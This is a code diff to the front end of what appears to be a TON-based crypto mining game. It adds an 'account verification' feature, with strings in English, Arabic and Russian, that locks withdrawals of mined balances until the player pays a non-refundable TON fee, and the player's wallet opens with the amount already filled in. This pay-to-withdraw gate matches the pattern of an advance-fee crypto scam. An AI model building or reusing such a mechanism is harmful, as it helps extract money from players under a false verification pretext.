@@ -536,6 +536,23 @@ const I18N = {
   "nft.stuck": "Your payment arrived, but the NFT could not be given right now. The team was told and will fix it or send your TON back.",
   "nft.orderName": "Mystery NFT",
   "nft.orderGot": "Got {name}",
+  "vf.title": "Account verification",
+  "vf.status": "Status",
+  "vf.yes": "Verified ✅",
+  "vf.no": "Not verified",
+  "vf.body": "Verify your account once to unlock withdrawals. It is a one-time payment of {n} TON.",
+  "vf.btn": "Verify for {n} TON",
+  "vf.processing": "Processing…",
+  "vf.note": "One-time payment. It is not refunded once your account is verified.",
+  "vf.need": "Verify your account first to withdraw. See the verification card above.",
+  "vf.done": "Account verified!",
+  "vf.doneBody": "Thank you. Withdrawals are unlocked.",
+  "vf.stuck": "Your payment arrived, but the verification could not be completed right now. The team was told and will fix it or send your TON back.",
+  "vf.orderName": "Account verification",
+  "vf.orderDone": "Verified",
+  "vf.orderPaid": "Paid · being checked",
+  "err.not_verified": "Verify your account first ({n} TON, one time) to withdraw.",
+  "err.already_verified": "Your account is already verified.",
   "nft.rarity.common": "Common",
   "nft.rarity.rare": "Rare",
   "nft.rarity.epic": "Epic",
@@ -771,6 +788,23 @@ const I18N = {
   "nft.stuck": "وصل دفعك لكن تعذّر منح الـ NFT الآن. تم إبلاغ الفريق وسيصلح الأمر أو يعيد إليك TON.",
   "nft.orderName": "NFT غامض",
   "nft.orderGot": "حصلت على {name}",
+  "vf.title": "توثيق الحساب",
+  "vf.status": "الحالة",
+  "vf.yes": "موثّق ✅",
+  "vf.no": "غير موثّق",
+  "vf.body": "وثّق حسابك مرة واحدة لفتح السحب. الدفع لمرة واحدة بقيمة {n} TON.",
+  "vf.btn": "وثّق مقابل {n} TON",
+  "vf.processing": "جارٍ المعالجة…",
+  "vf.note": "دفعة لمرة واحدة. لا يتم استردادها بعد توثيق حسابك.",
+  "vf.need": "وثّق حسابك أولاً لتتمكن من السحب. راجع بطاقة التوثيق أعلاه.",
+  "vf.done": "تم توثيق الحساب!",
+  "vf.doneBody": "شكراً لك. أصبح السحب متاحاً.",
+  "vf.stuck": "وصل دفعك لكن تعذّر إكمال التوثيق الآن. تم إبلاغ الفريق وسيصلح الأمر أو يعيد إليك TON.",
+  "vf.orderName": "توثيق الحساب",
+  "vf.orderDone": "تم التوثيق",
+  "vf.orderPaid": "تم الدفع · قيد المراجعة",
+  "err.not_verified": "وثّق حسابك أولاً ({n} TON لمرة واحدة) لتتمكن من السحب.",
+  "err.already_verified": "حسابك موثّق بالفعل.",
   "nft.rarity.common": "شائعة",
   "nft.rarity.rare": "نادرة",
   "nft.rarity.epic": "ملحمية",
@@ -1006,6 +1040,23 @@ const I18N = {
   "nft.stuck": "Платёж пришёл, но выдать NFT сейчас не удалось. Команда уведомлена и исправит это или вернёт TON.",
   "nft.orderName": "Загадочный NFT",
   "nft.orderGot": "Получена: {name}",
+  "vf.title": "Верификация аккаунта",
+  "vf.status": "Статус",
+  "vf.yes": "Верифицирован ✅",
+  "vf.no": "Не верифицирован",
+  "vf.body": "Верифицируйте аккаунт один раз, чтобы открыть вывод. Разовый платёж — {n} TON.",
+  "vf.btn": "Верифицировать за {n} TON",
+  "vf.processing": "Обработка…",
+  "vf.note": "Разовый платёж. После верификации аккаунта он не возвращается.",
+  "vf.need": "Сначала верифицируйте аккаунт, чтобы выводить средства. См. карточку верификации выше.",
+  "vf.done": "Аккаунт верифицирован!",
+  "vf.doneBody": "Спасибо. Вывод открыт.",
+  "vf.stuck": "Платёж пришёл, но завершить верификацию сейчас не удалось. Команда уведомлена и исправит это или вернёт TON.",
+  "vf.orderName": "Верификация аккаунта",
+  "vf.orderDone": "Верифицировано",
+  "vf.orderPaid": "Оплачено · проверяется",
+  "err.not_verified": "Сначала верифицируйте аккаунт ({n} TON, один раз), чтобы выводить средства.",
+  "err.already_verified": "Ваш аккаунт уже верифицирован.",
   "nft.rarity.common": "Обычная",
   "nft.rarity.rare": "Редкая",
   "nft.rarity.epic": "Эпическая",
@@ -1287,6 +1338,12 @@ function viewBuy() {
 }
 
 function orderCard(o) {
+  if (o.kind === "verify") {
+    const label = o.status === "delivered" ? t("vf.orderDone") : o.status === "paid" ? t("vf.orderPaid") : t("status." + o.status);
+    return '<div class="card"><div style="display:flex;justify-content:space-between;align-items:center;gap:8px"><b>#' + esc(o.id) + '</b><span class="status st-' + esc(o.status) + '">' + esc(label) + "</span></div>" +
+      '<div style="margin:8px 0 2px;font-weight:700"><bdi>' + esc(nf(o.ton, 4)) + " TON → " + esc(t("vf.orderName")) + '</bdi></div><div class="muted">' + esc(dateText(o.deliveredAt || o.paidAt || o.createdAt)) + "</div>" +
+      (o.status === "paid" ? '<button class="btn ghost small" style="margin-top:10px" data-a="refund" data-id="' + esc(o.id) + '">' + esc(t("orders.refund")) + "</button>" : "") + "</div>";
+  }
   if (o.kind === "nft") {
     const it = S.nft && S.nft.items.find((x) => x.id === o.nftId);
     const label = o.status === "delivered" && it ? t("nft.orderGot", { name: nftText("n", it) }) : t("status." + o.status);
@@ -1313,7 +1370,7 @@ function viewOrders() {
 
 /** The wallet tab: connect / disconnect, mined balance + withdraw, history, terms. */
 function viewWallet() {
-  return walletCard() + withdrawCard() +
+  return walletCard() + verifyCard() + withdrawCard() +
     '<div class="card"><h3>' + esc(t("wd.history")) + "</h3>" + (S.withdrawals.length ? S.withdrawals.map(wdRow).join("") : '<div class="muted">' + esc(t("wd.empty")) + "</div>") + "</div>" +
     viewOrders() +
     '<button class="btn ghost ic termsbtn" data-a="terms">' + svgi("doc") + esc(t("terms.btn")) + "</button>";
@@ -1426,6 +1483,7 @@ function withdrawCard() {
   let body;
   if (!m.withdrawOpen) body = '<div class="muted">' + esc(t("wd.closed")) + "</div>";
   else if (!acc) body = '<div class="muted">' + esc(t("wd.connect")) + "</div>";
+  else if (S.verify && S.verify.required && !S.verify.verified) body = '<div class="muted">' + esc(t("vf.need")) + "</div>";
   else {
     body = '<div class="muted" style="margin-bottom:8px">' + esc(t("wd.amount")) + " · " + esc(t("wd.min", { min: nf(m.minWithdraw, 4) })) + "</div>" +
       '<div class="field"><input id="wdAmt" inputmode="decimal" autocomplete="off" placeholder="0" value="' + esc(wdAmount) + '" /><span>UTYA</span><button class="btn ghost small" data-a="wdAll">' + esc(t("wd.all")) + "</button></div>" +
@@ -1688,6 +1746,71 @@ async function runNftPay() {
       const st = r.order.status;
       if (st === "delivered") { busy = false; S = r.state; tab = "nft"; buzz("ok"); showNftWon(r.order); render(); return; }
       if (st === "paid" || st === "refund_requested" || st === "refunded") { busy = false; S = r.state; openOverlay("<h2>⚠️</h2><p class=\"muted\">" + esc(t("nft.stuck")) + '</p><button class="btn" data-a="closeov">' + esc(t("pay.close")) + "</button>"); render(); return; }
+    }
+    await new Promise((res) => setTimeout(res, 3000));
+  }
+  busy = false; showPay("slow");
+}
+
+// ------------------------------------------------------------------ account verification (pay once in TON)
+let vfProcessing = false;
+const vfPayBtn = () => vfProcessing
+  ? '<button class="btn loading" data-a="vfPay"><span class="bspin"></span>' + esc(t("vf.processing")) + "</button>"
+  : '<button class="btn" data-a="vfPay">' + esc(t("vf.btn", { n: nf(S.verify.priceTon, 2) })) + "</button>";
+function setVfBusy(on) {
+  vfProcessing = on;
+  document.querySelectorAll('[data-a="vfPay"]').forEach((b) => {
+    if (on) { b.classList.add("loading"); b.innerHTML = '<span class="bspin"></span>' + esc(t("vf.processing")); }
+    else if (S && S.verify) { b.classList.remove("loading"); b.textContent = t("vf.btn", { n: nf(S.verify.priceTon, 2) }); }
+  });
+}
+
+/** The verification card of the wallet tab: the status and, until the account is verified, the pay button. Hidden when verification is off and the player has none. */
+function verifyCard() {
+  const v = S.verify;
+  if (!v || (!v.required && !v.verified)) return "";
+  const head = '<h3>' + esc(t("vf.title")) + '</h3><div class="row"><span>' + esc(t("vf.status")) + "</span><b>" + esc(t(v.verified ? "vf.yes" : "vf.no")) + "</b></div>";
+  if (v.verified) return '<div class="card">' + head + "</div>";
+  return '<div class="card hero">' + head + '<div class="muted" style="margin:8px 0">' + esc(t("vf.body", { n: nf(v.priceTon, 2) })) + "</div>" + vfPayBtn() + '<div class="muted" style="margin-top:10px">' + esc(t("vf.note")) + "</div></div>";
+}
+
+function showVerified() {
+  openOverlay('<div class="okmark">✓</div><h2>' + esc(t("vf.done")) + '</h2><p class="muted">' + esc(t("vf.doneBody")) + '</p><button class="btn" data-a="closeov">' + esc(t("nft.great")) + "</button>");
+}
+
+async function startVerifyPay() {
+  if (busy || vfProcessing) return;
+  setVfBusy(true);
+  try { await runVerifyPay(); } finally { setVfBusy(false); }
+}
+async function runVerifyPay() {
+  if (busy) return;
+  const ui = await getTon();
+  if (!ui) return toast(t("err.generic"), "err");
+  const acc = ui.account;
+  if (!acc) return ui.openModal();
+  busy = true;
+  let prepared;
+  try {
+    await ensureWallet(acc); // the server makes the order only when it knows the wallet
+    prepared = (await api("/api/verify/prepare", {})).payment;
+  } catch (e) {
+    busy = false;
+    if (e && e.code === "already_verified") { await refreshState(); return toast(errText(e), "ok"); }
+    return fail(e);
+  }
+  try {
+    await sendToWallet(ui, acc, prepared); // the wallet opens by itself with the amount filled in; the player only confirms
+  } catch (e) { busy = false; closeOverlay(); api("/api/pay/cancel", { id: prepared.id }).catch(() => {}); /* the order is dropped quietly: no message to anybody */ return toast(t("pay.cancelled"), "err"); }
+  showPay("wait");
+  const started = Date.now();
+  while (Date.now() - started < 180000) {
+    let r = null;
+    try { r = await api("/api/pay/check", { id: prepared.id }); } catch (e) { /* keep trying */ }
+    if (r && r.order) {
+      const st = r.order.status;
+      if (st === "delivered") { busy = false; S = r.state; tab = "wallet"; buzz("ok"); showVerified(); render(); return; }
+      if (st === "paid" || st === "refund_requested" || st === "refunded") { busy = false; S = r.state; openOverlay("<h2>⚠️</h2><p class=\"muted\">" + esc(t("vf.stuck")) + '</p><button class="btn" data-a="closeov">' + esc(t("pay.close")) + "</button>"); render(); return; }
     }
     await new Promise((res) => setTimeout(res, 3000));
   }
@@ -2021,6 +2144,7 @@ document.addEventListener("click", async (ev) => {
   }
   if (a === "nftAsk") return nftPopup();
   if (a === "nftPay") return startNftPay();
+  if (a === "vfPay") return startVerifyPay();
   if (a === "openWallet") { openWalletApp(ton()); return; }
   if (a === "closeov") return closeOverlay();
   if (a === "toOrders") { closeOverlay(); tab = "wallet"; render(); return; }
